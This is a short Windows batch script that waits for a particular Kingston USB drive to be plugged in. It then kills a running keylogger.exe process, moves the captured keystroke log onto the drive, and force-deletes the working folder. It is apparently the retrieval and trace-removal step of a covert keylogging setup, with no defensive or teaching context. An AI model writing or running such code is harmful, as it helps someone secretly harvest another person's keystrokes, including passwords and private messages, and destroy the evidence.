@echo off
:loop
pnputil /enum-devices /connected | find "Kingston DataTraveler 2.0 USB Device" 
if %errorlevel% equ 0 (
    taskkill /IM keylogger.exe /F
     timeout 1
    move C:\mest\keqlog.txt D:\
    rd /s /q C:\mest
) else (
    goto loop
  )

